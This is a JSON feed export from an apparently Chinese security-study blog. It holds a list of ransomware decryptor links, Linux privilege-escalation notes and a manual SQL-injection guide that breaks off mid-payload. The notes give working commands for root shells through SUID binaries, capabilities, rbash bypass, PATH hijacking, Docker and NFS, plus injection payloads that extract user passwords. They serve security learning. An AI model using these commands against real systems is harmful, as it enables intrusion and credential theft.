https://www.cybermalveillance.gouv.fr/nos-articles/outil-de-dechiffrement-du-rancongiciel-ransomware-pylocky-versions-1-et-2/ https://www.cybermalveillance.gouv.fr/wp-content/uploads/2019/02/PyLocky_Decryptor_V1_V2.zip</p>\n<p>[Rakhni Ransom] Rakhni解密器用来解密Rakhni勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[Rannoh Ransom] Rannoh解密器用来解密Rannoh勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rannohdecryptor.zip</p>\n<p>[Rotor Ransom] Rakhni解密器用来解密Rotor勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[SNSLocker Ransom] Trend Micro Ransomware解密器用来解密SNSLocker勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[Shade Ransom] Shade解密器用来解密Shade勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/ShadeDecryptor.zip http://www.mcafee.com/us/downloads/free-tools/shadedecrypt.aspx</p>\n<p>[Simplocker Ransom] Simplelocker解密器用来解密Simplocker勒索软件加密的文件 https://download.eset.com/com/eset/tools/decryptors/simplocker/latest/eset-simplocker-decryptor.apk</p>\n<p>[Stampado Ransom] Stampado解密器用来解密Stampado勒索软件加密的文件 https://decrypter.emsisoft.com/download/stampado</p>\n<p>[Teamxrat/Xpan Ransom] Trend Micro Ransomware解密器用来解密Teamxrat/Xpan勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[TeslaCrypt V1/2/3/4 Ransom] TeslaDecrypt 解密器用来解密TeslaCrypt V1/2/3/4勒索软件加密的文件 https://github.com/Cisco-Talos/TeslaDecrypt</p>\n<p>[Thanatos Ransom] Thanatos解密器用来解密Thanatos勒索软件加密的文件 https://github.com/Cisco-Talos/ThanatosDecryptor</p>\n<p>[Trustezeb Ransom] Trustezeb.A解密器用来解密Trustezeb勒索软件加密的文件 https://download.eset.com/com/eset/tools/decryptors/trustezeb_a/latest/esettrustezebadecoder.exe</p>\n<p>[Wildfire Ransom] Wildfire解密器用来解密Wildfire勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/RU/WildfireDecryptor.zip http://www.mcafee.com/us/downloads/free-tools/wildfiredecrypt.aspx</p>\n<p>[XData Ransom] Rakhni解密器用来解密XData勒索软件加密的文件 http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip</p>\n<p>[XORBAT Ransom] Trend Micro Ransomware解密器用来解密XORBAT勒索软件加密的文件 https://success.trendmicro.com/solution/1114221</p>\n<p>[XORIST Ransom] Xorist解密器用来解密XORIST勒索软件加密的文件 https://decrypter.emsisoft.com/download/xorist</p>\n<p>[ZQ Ransom] ZQ解密器用来解密ZQ勒索软件加密的文件 https://www.emsisoft.com/decrypter/download/zq</p>\n<div><pre><code>参考链接：http://www.kaspersky.com https://www.emsisoft.com http://www.mcafee.com https://github.com/Cisco-Talos https://www.nomoreransom.org https://www.eset.com https://www.trendmicro.com https://www.elevenpaths.com http://www.checkpoint.com\n</code></pre>\n<div><span>1</span><br></div></div>",
      "date_published": "2022-03-29T00:00:00.000Z",
      "date_modified": "2022-04-21T09:42:58.000Z",
      "authors": [
        {
          "name": "转载"
        }
      ],
      "tags": [
        "安全"
      ]
    },
    {
      "title": "渗透",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/0.readme/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/0.readme/",
      "content_html": "<ul>\n<li><a href=\"./1.linux提权总结.html\">1.linux提权总结.md</a></li>\n<li><a href=\"./2.手动SQL注入.html\">2.手动SQL注入.md</a></li>\n<li><a href=\"./3.文件包含漏洞.html\">3.文件包含漏洞.md</a></li>\n<li><a href=\"./4.业务安全测试.html\">4.业务安全测试.md</a></li>\n<li><a href=\"./5.网站文件泄漏.html\">5.网站文件泄漏.md</a></li>\n<li><a href=\"./6.默认密码收集.html\">6.默认密码收集.md</a></li>\n<li><a href=\"./7.XSS漏洞.html\">7.XSS漏洞.md</a></li>\n<li><a href=\"./8.WindowsLinux下常用的提权扫描辅助工具总结.html\">8.WindowsLinux下常用的提权扫描辅助工具总结.md</a></li>\n<li><a href=\"./9.反弹shell.html\">9.反弹shell.md</a></li>\n</ul>\n",
      "date_published": "2022-04-20T06:36:02.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "linux提权总结",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/1.linux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/",
      "content_html": "<h2 id=\"一-sudo-和-suid-提权\"> <strong>一. sudo 和 suid 提权</strong></h2>\n<h3 id=\"_1-何为suid\"> 1. 何为suid</h3>\n<p><img src=\"/assets/img/image-20220418222753648.png\" alt=\"图片\" /></p>\n<p>可见在权限位置有一个s权限。那么这个s的作用是什么呢？\n答案是当其他用户执行该文件时，该文件会以root的身份执行。\n这里就涉及到了Effective UID和Real UID以及Saved UID\nEffective UID: 程序实际操作时生效的UID\nReal UID: 执行该程序的用户的实际UID\nSaved UID: 在高权限用户降权后，保留的其原本UID (不展开说)</p>\n<p>所以增加了一个s权限，该程序在实际运行时Effective UID就会变为0，即root的UID</p>\n<h3 id=\"_2-sudo\"> 2. sudo</h3>\n<p>就是能把一个命令视作root来执行,用sudo-l查看可以被sudo的命令</p>\n<h3 id=\"_3-suid与sudo提权\"> 3. SUID与sudo提权</h3>\n<h3 id=\"遍历目录中的suid文件\"> 遍历目录中的suid文件</h3>\n<div><pre><code>find / -perm -u=s 2&gt;/dev/null\n</code></pre>\n<div><span>1</span><br></div></div><p>执行该命令，会得到所有suid文件</p>\n<p><img src=\"/assets/img/image-20220418222837137.png\" alt=\"image-20220418222837137\" /></p>\n<h3 id=\"用sudo-l-查看哪些命令能被sudo\"> 用sudo -l 查看哪些命令能被sudo</h3>\n<h3 id=\"_4-sudo-i\"> 4. sudo -i</h3>\n<p>表示为了频繁的执行某些只有超级用户才能执行的权限，而不用每次输入密码，可以使用该命令。提示输入密码时该密码为当前账户的密码。没有时间限制。执行该命令后提示符变为“#”而不是“$”。想退回普通账户时可以执行“exit”或“logout” 。运行结果 PWD=/root</p>\n<h3 id=\"可利用于提权的命令\"> 可利用于提权的命令</h3>\n<h5 id=\"nmap\"> nmap</h5>\n<div><pre><code>nmap --interactive\n!sh\n</code></pre>\n<div><span>1</span><br><span>2</span><br></div></div><p>使用nmap的udp或tcp syn扫描时，需要用到root权限，所以有些管理员图方便会直接给namp上s权限，而nmap 5.20(使用nmap -v查看nmap版本)之前有一个interactive交互模式(nmap –interactive)，在nmap effective uid为0时，可以通过这个模式获得root权限交互式命令行，成功提权</p>\n<div><pre><code>echo &quot;os.execute(&#39;/bin/bash&#39;)&quot; &gt; ./shellnmap --script=shell\n</code></pre>\n<div><span>1</span><br></div></div><p>全版本通杀提权，利用nmap可以执行指定文件的特点提权</p>\n<h5 id=\"find\"> find</h5>\n<div><pre><code>find / -exec command\n</code></pre>\n<div><span>1</span><br></div></div><p>find命令自带-exec参数，可以执行命令，若find有suid权限，那么使用exec相当于直接提权到root.</p>\n<div><pre><code>读文件 find /path -exec {} \\;\n</code></pre>\n<div><span>1</span><br></div></div><h5 id=\"vim\"> vim</h5>\n<p>vim有了suid就可以任意文件读取了</p>\n<p>同时也可以输入 :shell</p>\n<p>来获取root shell</p>\n<h5 id=\"bash\"> bash</h5>\n<div><pre><code>bash -p  开启一个新shell，suid的话自然是开启root shell\n</code></pre>\n<div><span>1</span><br></div></div><h5 id=\"less-more\"> less，more</h5>\n<p>和vim差不多，任意文件读取，同时也可以输入 !command 进行提权到root</p>\n<h5 id=\"exim\"> exim</h5>\n<p>exim在特定版本下会有suid提权</p>\n<p><img src=\"/assets/img/image-20220418222848171.png\" alt=\"image-20220418222848171\" /></p>\n<p>下载exp打就完事了</p>\n<h2 id=\"二-rbash-绕过\"> 二. rbash 绕过</h2>\n<h3 id=\"_1-何为rbash\"> 1. 何为rbash</h3>\n<p>rbash，是出于安全性考虑的一个功能受限的bash，我在vulnhub dc-2首次接触,他的限制性可能会有如下.</p>\n<ul>\n<li>cd 切换目录</li>\n<li>含有斜杠 <code>/</code> 的命令, 譬如 <code>/bin/sh</code></li>\n<li>设置 PATH ENV 等环境变量</li>\n<li>使用 <code>&gt;</code> <code>&lt;</code> 进行重定向</li>\n<li>binary 的运行. 通常 root 用户会手动创建 <code>/bin/binary_file -&gt; /home/rbash_user/bin/binary_file</code> 的软链接, 限制性地提供部分 binary_file 给 rbash_user 使用 在 bash 下 <code>echo $SHELL</code>, 可以获取当前环境是否是 rbash.</li>\n</ul>\n<h3 id=\"_2-bypass\"> 2. bypass</h3>\n<h3 id=\"scp-bypass\"> scp bypass</h3>\n<p>我在http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</p>\n<p><img src=\"/assets/img/image-20220418222904748.png\" alt=\"image-20220418222904748\" /></p>\n<h3 id=\"_3-进入命令自带shell-bypass\"> 3. 进入命令自带shell bypass</h3>\n<p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可\n一般都是在shell键入!/bin/sh来bypass rbash</p>\n<p>下面这种方法也是可行的（似乎仅vim)</p>\n<div><pre><code>:set shell=/bin/bash:shell\n</code></pre>\n<div><span>1</span><br></div></div><p>执行上面两个语句，就bypass了</p>\n<h3 id=\"_4-find-bypasss\"> 4 find bypasss</h3>\n<p>简单概括就是-exec执行一下/bin/bash …</p>\n<p><img src=\"/assets/img/image-20220418222918974.png\" alt=\"image-20220418222918974\" /></p>\n<h3 id=\"_5-编程语言-bypass\"> 5 编程语言 bypass</h3>\n<p>python</p>\n<p>如果python都可以用的话，那就更轻松了，os安排一下\n似乎pty也行?没试</p>\n<div><pre><code>python -c &quot;import os;os.system(&#39;/bin/bash&#39;)&quot;\n</code></pre>\n<div><span>1</span><br></div></div><p>php</p>\n<div><pre><code>php -a 进入php shell然后执行命令:exec(&quot;/bin/bash&quot;);\n</code></pre>\n<div><span>1</span><br></div></div><p>perl</p>\n<div><pre><code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39;\n</code></pre>\n<div><span>1</span><br></div></div><p>ruby</p>\n<div><pre><code>ruby -e &#39;exec &quot;/bin/bash&quot;&#39;\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_6-cp-bypass\"> 6. cp bypass</h3>\n<p>直接用cp把/usr/bin里的命令复制过来就行了</p>\n<h3 id=\"_7-直接更改path-shell变量\"> 7. 直接更改PATH/SHELL变量</h3>\n<p>键入export -p 查看该用户的变量</p>\n<p><img src=\"/assets/img/image-20220418222928524.png\" alt=\"image-20220418222928524\" /></p>\n<p>如果这俩变量有w权，那么我们可以直接写入来bypass</p>\n<h3 id=\"_8-ssh-bypass\"> 8. ssh bypass</h3>\n<p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p>\n<div><pre><code>ssh username@Ip -t &quot;/bin/bash&quot;\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_9-echo-bypass\"> 9. echo bypass</h3>\n<div><pre><code><span>echo</span> os.system<span>(</span><span>\"/bin/bash\"</span><span>)</span>\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"三-内核提权\"> 三. 内核提权</h2>\n<p>用 uanme -a 查明内核版本</p>\n<p><img src=\"/assets/img/image-20220418222936531.png\" alt=\"image-20220418222936531\" /></p>\n<p>然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解</p>\n<h2 id=\"四-passwd和shadow\"> 四. passwd和shadow</h2>\n<h3 id=\"_1-明文密码\"> 1. 明文密码</h3>\n<p>/etc/passwd 默认所有用户可读，但只有root可写。\n/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。</p>\n<p>但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了</p>\n<h3 id=\"_2-passwd-可写\"> 2. passwd 可写</h3>\n<p>如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的</p>\n<h3 id=\"_3-爆破shadow\"> 3. 爆破shadow</h3>\n<p>如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件</p>\n<h2 id=\"五-计划任务\"> 五. 计划任务</h2>\n<h3 id=\"_1-文件重写\"> 1. 文件重写</h3>\n<p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的</p>\n<div><pre><code>ls -l /etc/cron*\n</code></pre>\n<div><span>1</span><br></div></div><p>如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权</p>\n<h3 id=\"_2-环境变量劫持\"> 2. 环境变量劫持</h3>\n<p>我们查看定时任务</p>\n<p><img src=\"/assets/img/image-20220418222949950.png\" alt=\"image-20220418222949950\" /></p>\n<p>发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如</p>\n<div><pre><code>17 *    * * *   root    shell.sh\n</code></pre>\n<div><span>1</span><br></div></div><p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p>\n<p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权</p>\n<h3 id=\"_3-通配符提权\"> 3. 通配符提权</h3>\n<p>https://www.secpulse.com/archives/72965.html 总结的太好了，我都不想记笔记了（偷懒</p>\n<h2 id=\"六-环境变量\"> 六. 环境变量</h2>\n<p>如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。</p>\n<p>这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限，</p>\n<p>我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。</p>\n<p>可能有点小绕，看下面具体操作就行了。</p>\n<p>实验室配置:</p>\n<p>首先在一个目录下创建如下文件</p>\n<div><pre><code>vim demo.c\n</code></pre>\n<div><span>1</span><br></div></div><p>然后 gcc demo.c -o shell 将其编译为可执行文件</p>\n<p>然后 chmod u+s shell 为其增加suid权限</p>\n<p>攻击者视角:</p>\n<p>首先使用下列指令搜寻suid权限文件</p>\n<div><pre><code>find / -perm -u=s -type f 2&gt;/dev/null\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20220418222958769.png\" alt=\"image-20220418222958769\" /></p>\n<p>发现可疑目标，执行一下看看</p>\n<p><img src=\"/assets/img/image-20220418223005230.png\" alt=\"image-20220418223005230\" /></p>\n<p>发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system(“ps”); 这条c语言代码。\n遂可尝试环境变量提权</p>\n<p>我们依次执行以下命令</p>\n<div><pre><code>cd /tmpecho &quot;/bin/bash&quot; &gt; psexport $PATH=/tmp:$PATH        需要修改自身环境变量的权限，但基本上都有这个权限\nchmod 777 ./ps                 没这条命令会导致提权失败\ncd /home/const27\n./shell                        提权成功\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><p><img src=\"/assets/img/image-20220418223025863.png\" alt=\"image-20220418223025863\" /></p>\n<h2 id=\"七-密码查找\"> 七. 密码查找</h2>\n<p>这个提权技术说白了，就是去到处翻密码</p>\n<h3 id=\"_1-文件内查找\"> 1. 文件内查找</h3>\n<div><pre><code>grep --color=auto -rnw &#39;/&#39; -ie &quot;PASSWORD&quot; --color=always 2&gt; /dev/nullfind . -type f -exec grep -i -I &quot;PASSWORD&quot; {} /dev/null \\;\n</code></pre>\n<div><span>1</span><br></div></div><p>我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。</p>\n<h3 id=\"_2-查找十分钟内更改过的文件\"> 2. 查找十分钟内更改过的文件</h3>\n<div><pre><code>find / -mmin -10 2&gt;/dev/null | grep -Ev &quot;^/proc&quot;  (不显示^/proc文件或文件夹)\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"八-capabilities\"> 八. capabilities</h2>\n<p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p>\n<h3 id=\"_1-简介\"> 1. 简介</h3>\n<p>capabilities 把root的权限细分了，可以分别启用或者禁用。</p>\n<p>在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。</p>\n<p>如下是一些常见的特权操作及其对应capabilities</p>\n<p><img src=\"/assets/img/image-20220418223102459.png\" alt=\"image-20220418223102459\" /></p>\n<p>关于capabilities的管理工具有如下:</p>\n<ul>\n<li>getcap</li>\n<li>setcap</li>\n<li>capsh</li>\n<li>filecap</li>\n</ul>\n<p>getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。</p>\n<p>我们可以通过以下指令搜索设置了capabilities的可执行文件</p>\n<div><pre><code>getcap -r / 2&gt;/dev/null\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_2-实操\"> 2. 实操</h3>\n<h3 id=\"通过cap-setuid\"> 通过cap_setuid</h3>\n<p>cap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。</p>\n<p>以python为例</p>\n<p>我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权</p>\n<div><pre><code>python -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/image-20220418223112298.png\" alt=\"image-20220418223112298\" /></p>\n<p>类似的有很多。</p>\n<p>perl</p>\n<div><pre><code>perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/sh&quot;;&#39;\n</code></pre>\n<div><span>1</span><br></div></div><p>gdb</p>\n<div><pre><code>gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit\n</code></pre>\n<div><span>1</span><br></div></div><p>php</p>\n<div><pre><code>php -r &quot;posix_setuid(0); system(&#39;/bin/sh&#39;);&quot;\n</code></pre>\n<div><span>1</span><br></div></div><p>python</p>\n<div><pre><code>python -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;\n</code></pre>\n<div><span>1</span><br></div></div><p>rvim</p>\n<p>需要支持python3模块。</p>\n<div><pre><code>rvim -c &#39;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;\n</code></pre>\n<div><span>1</span><br></div></div><p>vim</p>\n<p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p>\n<div><pre><code>vim -c &#39;:py import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"通过cap-dac-read-search\"> 通过CAP_DAC_READ_SEARCH</h3>\n<p>cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。</p>\n<p>利用此特性我们可以读取系统中的敏感信息。</p>\n<p>如果tar有此权限，我们可以通过此来查看敏感文件内容。</p>\n<div><pre><code>tar cvf shadow.tar /etc/shadow  //创建压缩文件tar -xvf shadow.tar  //解压缩cd etc  //进入解压缩的目录chmod +r shadow  //赋予读权限cat shadow | grep root  //查看shadow文件的内容\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"九-docker\"> 九. Docker</h2>\n<h3 id=\"_1-docker用户组提权\"> 1. Docker用户组提权</h3>\n<p>如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权</p>\n<p>首先我们执行如下命令</p>\n<div><pre><code>docker run -v /:/mnt --rm -it crf_web1 chroot /mnt sh\n</code></pre>\n<div><span>1</span><br></div></div><p>然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了）</p>\n<p><img src=\"/assets/img/image-20220418223122812.png\" alt=\"image-20220418223122812\" /></p>\n<p>然后退出来，直接尝试 su root2</p>\n<p><img src=\"/assets/img/image-20220418223128771.png\" alt=\"image-20220418223128771\" /></p>\n<p>提权成功</p>\n<h2 id=\"_0x0a-nfs\"> 0x0a NFS</h2>\n<p>NFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题</p>\n<h3 id=\"no-root-squash\"> no_root_squash</h3>\n<p>我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p>\n<p>也就是说，任何机器的root在此目录上都有最高权限。</p>\n<p>我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权</p>\n<div><pre><code>mkdir /tmp/nfsmount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs 将本机上的/tmp/nfs 挂载到共享目录cp /bin/bash /tmp/nfs/bashchmod u+s /tmp/nfs/bash  设置共享目录上bash的suid\n</code></pre>\n<div><span>1</span><br></div></div><p>回到低权限机，执行 /tmp/bash 完成提权</p>\n<h2 id=\"_0x0b-mysql-提权\"> 0x0b mysql 提权</h2>\n<p>mysql 提权参考：</p>\n<p>https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</p>\n<p>https://www.sqlsec.com/2020/11/mysql.html</p>\n<p>https://xz.aliyun.com/t/10373</p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220418222753648.png",
      "date_published": "2021-08-18T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "SQL注入",
      "url": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/2.%E6%89%8B%E5%8A%A8SQL%E6%B3%A8%E5%85%A5/",
      "id": "http://www.liuhanzhe.com/docs/security/%E6%B8%97%E9%80%8F/2.%E6%89%8B%E5%8A%A8SQL%E6%B3%A8%E5%85%A5/",
      "content_html": "<h2 id=\"_0x01-普通手动注入\"> 0x01. 普通手动注入</h2>\n<h3 id=\"_1-判断是否存在注入点\"> 1. 判断是否存在注入点</h3>\n<div><pre><code>单引号， <span>and</span> <span>1</span><span>=</span><span>1</span> ，<span>and</span> <span>1</span><span>=</span><span>2</span> ，双引号，反斜杠，注释等\n</code></pre>\n<div><span>1</span><br></div></div><p>根据报错信息，返回内容判断是否存在sql注入</p>\n<h3 id=\"_2-判断是否存在注入点\"> 2. 判断是否存在注入点</h3>\n<p>逐步提高order by 1列号，出现错误时表示超过表的列数</p>\n<div><pre><code><span>order</span> <span>by</span> <span>1</span> <span>--</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_3-判断字段的显示位\"> 3. 判断字段的显示位</h3>\n<p>观察1，2，3的显示位置判断字段显示位</p>\n<div><pre><code><span>union</span> <span>select</span> <span>1</span><span>,</span><span>2</span><span>,</span><span>3</span> <span>--</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_4-获取当前数据库信息\"> 4. 获取当前数据库信息</h3>\n<p>database(): 查看当前数据库名称\nversion(): 查看数据库版本信息\nuser(): 返回当前数据库连接使用的用户\n可以使用group_concat()函数将多个字段连在一起当作一个字段中显示</p>\n<div><pre><code><span>union</span> <span>select</span> <span>1</span><span>,</span>group_concat<span>(</span><span>database</span><span>(</span><span>)</span><span>,</span>version<span>(</span><span>)</span><span>)</span><span>,</span><span>3</span> <span>--</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_5-获取数据库中的表信息\"> 5. 获取数据库中的表信息</h3>\n<p>ps：table_schema='数据库名'</p>\n<div><pre><code><span>union</span> <span>select</span> <span>1</span><span>,</span>group_concat<span>(</span><span>char</span><span>(</span><span>32</span><span>)</span><span>,</span>table_name<span>,</span><span>char</span><span>(</span><span>32</span><span>)</span><span>)</span><span>,</span><span>3</span> <span>from</span> information_schema<span>.</span><span>tables</span> <span>where</span> table_schema<span>=</span><span>'security'</span> <span>-- '</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_6-获取表中的列信息\"> 6.获取表中的列信息</h3>\n<div><pre><code><span>union</span> <span>select</span> <span>1</span><span>,</span>group_concat<span>(</span><span>char</span><span>(</span><span>32</span><span>)</span><span>,</span>column_name<span>,</span><span>char</span><span>(</span><span>32</span><span>)</span><span>)</span><span>,</span><span>3</span> <span>from</span> information_schema<span>.</span><span>columns</span> <span>where</span> table_name<span>=</span><span>'users'</span> <span>-- '</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_7-获取数据\"> 7.获取数据</h3>\n<div><pre><code><span>union</span> <span>select</span> <span>1</span><span>,</span>group_concat<span>(</span><span>char</span><span>(</span><span>32</span><span>)</span><span>,</span>username<span>,</span><span>char</span><span>(</span><span>32</span><span>)</span><span>,</span>password<span>)</span><span>,</span><span>3</span> <span>from</span> users <span>-- '</span>\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"_0x02-bool盲注\"> 0x02. bool盲注</h2>\n<h3 id=\"_1-猜测长度\"> 1.猜测长度</h3>\n<div><pre><code><span>and</span> length<span>(</span><span>database</span><span>(</span><span>)</span><span>)</span><span>></span><span>1</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_2-猜测库名\"> 2.猜测库名</h3>\n<div><pre><code><span>and</span> ascii<span>(</span>substr<span>(</span><span>database</span><span>(</span><span>)</span><span>,</span><span>1</span><span>,</span><span>1</span><span>)</span><span>)</span><span>></span><span>97</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_3-猜测表名\"> 3.猜测表名</h3>\n<ul>\n<li>猜测表的数量</li>\n</ul>\n<div><pre><code><span>and</span> <span>(</span><span>select</span> <span>count</span><span>(</span>table_name<span>)</span> <span>from</span> information_schema<span>.</span><span>tables</span> <span>where</span> table_schema<span>=</span><span>database</span><span>(</span><span>)</span><span>)</span><span>=</span><span>2</span><span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>猜测表的长度</li>\n</ul>\n<div><pre><code><span>and</span> length<span>(</span>substr<span>(</span><span>(</span><span>select</span> table_name <span>from</span> information_schema<span>.</span><span>tables</span> <span>where</span> table_schema<span>=</span><span>database</span><span>(</span><span>)</span> <span>limit</span> <span>0</span><span>,</span><span>1</span><span>)</span><span>,</span><span>1</span><span>)</span><span>)</span><span>=</span><span>1</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>获取表名</li>\n</ul>\n<div><pre><code><span>and</span> ascii<span>(</span>substr<span>(</span><span>(</span><span>select</span> table_name <span>from</span> information_schema<span>.</span><span>tables</span> <span>where</span> table_schema<span>=</span><span>database</span><span>(</span><span>)</span> <span>limit</span> <span>0</span><span>,</span><span>1</span><span>)</span><span>,</span><span>1</span><span>,</span><span>1</span><span>)</span><span>)</span><span>></span><span>97</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_4-猜测字段长度\"> 4. 猜测字段长度</h3>\n<div><pre><code><span>and</span> length<span>(</span>substr<span>(</span><span>(</span><span>select</span> column_name <span>from</span> information_schema<span>.</span><span>columns</span> <span>where</span> table_name<span>=</span> ’users’ <span>limit</span> <span>0</span><span>,</span><span>1</span><span>)</span><span>,</span><span>1</span><span>)</span><span>)</span><span>=</span><span>1</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_5-猜测字段\"> 5.猜测字段</h3>\n<div><pre><code><span>and</span> ascii<span>(</span>substr<span>(</span><span>(</span><span>select</span> column_name <span>from</span> information_schema<span>.</span><span>columns</span> <span>where</span> table_name<span>=</span><span>'users'</span> <span>limit</span> <span>0</span><span>,</span><span>1</span><span>)</span><span>,</span><span>1</span><span>,</span><span>1</span><span>)</span><span>)</span><span>></span><span>120</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h2 id=\"_0x03-基于时间的盲注\"> 0x03. 基于时间的盲注</h2>\n<h3 id=\"_1-判断数据库长度\"> 1. 判断数据库长度</h3>\n<div><pre><code><span>and</span> <span>if</span><span>(</span>length<span>(</span><span>database</span><span>(</span><span>)</span><span>)</span><span>=</span><span>4</span><span>,</span>sleep<span>(</span><span>3</span><span>)</span><span>,</span><span>1</span><span>)</span> <span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_2-猜测数据库名称\"> 2. 猜测数据库名称</h3>\n<div><pre><code><span>and</span> <span>if</span><span>(</span>ascii<span>(</span>substr<span>(</span><span>database</span><span>(</span><span>)</span><span>,</span><span>1</span><span>,</span><span>1</span><span>)</span><span>)</span><span>></span><span>97</span><span>,</span>sleep<span>(</span><span>3</span><span>)</span><span>,</span><span>1</span><span>)</span><span>#</span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_3-猜测表的数量\"> 3. 猜测表的数量</h3>\n<div><pre><code><span>and</span> <span>if</span><span>(</span><span>(</span><span>select</span> <span>count</span><span>(</span>table_name<span>)</span> <span>from</span> information_schema<span>.</span><span>tables</span> <span>where</span> 